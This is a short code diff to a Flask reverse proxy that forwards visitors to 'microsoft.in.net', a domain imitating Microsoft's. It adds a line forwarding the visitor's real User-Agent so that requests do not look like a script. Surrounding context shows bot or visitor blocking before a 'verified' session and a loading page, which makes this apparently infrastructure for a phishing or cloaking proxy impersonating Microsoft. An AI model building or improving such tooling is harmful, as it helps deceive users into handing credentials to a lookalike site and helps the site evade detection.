@@ -8,7 +8,7 @@ app = Flask(__name__)
 
 # --- CONFIGURATION ---
 # !! IMPORTANT: This MUST be your Netlify URL, not your custom domain
-TARGET_WEBSITE = "https://microsoft.in.net/"
+TARGET_WEBSITE = "https://microsoft.in.net"
 
 # Admin credentials
 ADMIN_USER = os.environ.get('ADMIN_USER', 'admin')
@@ -162,6 +162,8 @@ def main_proxy_handler(path):
             }
             # Set the correct Host header for the target site
             headers['Host'] = TARGET_WEBSITE.split('//')[1]
+            # **NEW FIX:** Pass the user's real User-Agent, not python-requests
+            headers['User-Agent'] = request.headers.get('User-Agent', 'Mozilla/5.0')
             
             resp = requests.request(
                 method=request.method,
@@ -218,5 +220,6 @@ def main_proxy_handler(path):
         # If not blocked, mark as verified and show the loading screen
         session['is_verified'] = True
         return render_template('loading.html')
+
 if __name__ == "__main__":
     app.run(debug=True, use_reloader=False)
